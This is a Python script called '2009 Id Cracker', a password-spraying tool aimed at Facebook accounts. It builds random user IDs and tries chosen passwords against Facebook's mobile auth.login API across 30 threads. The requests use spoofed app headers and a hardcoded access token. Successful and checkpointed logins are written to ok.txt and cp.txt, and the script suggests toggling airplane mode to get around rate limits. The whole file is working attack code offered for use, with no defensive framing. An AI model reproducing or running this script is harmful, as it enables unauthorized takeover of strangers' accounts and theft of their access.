W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')



class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
		print ("""\033[1;92m
		
		
 /$$$$$$$  /$$$$$$ /$$      /$$  /$$$$$$  /$$   /$$
| $$__  $$|_  $$_/| $$$    /$$$ /$$__  $$| $$$ | $$
| $$  \ $$  | $$  | $$$$  /$$$$| $$  \ $$| $$$$| $$
| $$$$$$$/  | $$  | $$ $$/$$ $$| $$  | $$| $$ $$ $$
| $$__  $$  | $$  | $$  $$$| $$| $$  | $$| $$  $$$$
| $$  \ $$  | $$  | $$\  $ | $$| $$  | $$| $$\  $$$
| $$  | $$ /$$$$$$| $$ \/  | $$|  $$$$$$/| $$ \  $$
|__/  |__/|______/|__/     |__/ \______/ |__/  \__/


\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;97m◆\033[1;91m] \033[1;93mFACEBOOK : BLACK-BOY 
\033[1;91m [\033[1;97m◆\033[1;91m] \033[1;92mFB GROUP : UNKNOWN  
\033[1;91m [\033[1;97m◆\033[1;91m] \033[1;96mGITHUB   : Black-Boy
\033[1;91m [\033[1;97m◆\033[1;91m] \033[1;91mAUTHOR  : RIMON-KHAN 
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %s2009 Id Cracker"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1.2"%(G,R,G,B,G))
		print("\n\n               [RANDOM ID COINING]")
		print("\n    \033[1;92m             \033[1;92m ")
		print("")
		print("%s [%s1%s]%s START CRACK (2009-11) %s"%(G,R,G,W,B))
		print("%s [%s2%s]%s EXIT %s"%(G,R,G,W,B))
		print("")
		rimon = input(" \033[0;91m[!]\033[0;92m CHOOSE : ")
		print("")
		if rimon in ["", " "]:
			Main()
		elif rimon in ["1", "01"]:
				    self.fbtua()
		elif rimon in ["2", "02"]:
		           self.id()
		
	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input("\033[0;91m [■]\033[0;92m TOTAL IDS TO CRACK (LIMIT 44000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;92m [■] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("")
				print("")
				listpass = input("%s [■] ENTER PASSWORD :%s "%(G,G))
				if len(listpass)<=5:
					exit("\n%s [■] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [■] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s [■] OK RESULTS SAVED IN -> Rimon ok.txt"%(G))
				print("%s [■] CP RESULTS SAVED IN -> Rimon cp.txt"%(G))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(W))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [■] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r%s[>_<] [RIMON] : %s/%s - \033[1;92m[OK:%s]-\033[1;92m[CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;92m   [RIMON-OK] %s | %s\033[1;92m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[1;92m   [RIMON] %s | %s\033[1;92m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:

		Main()

try:Main()
except Exception as e:exit(str(e))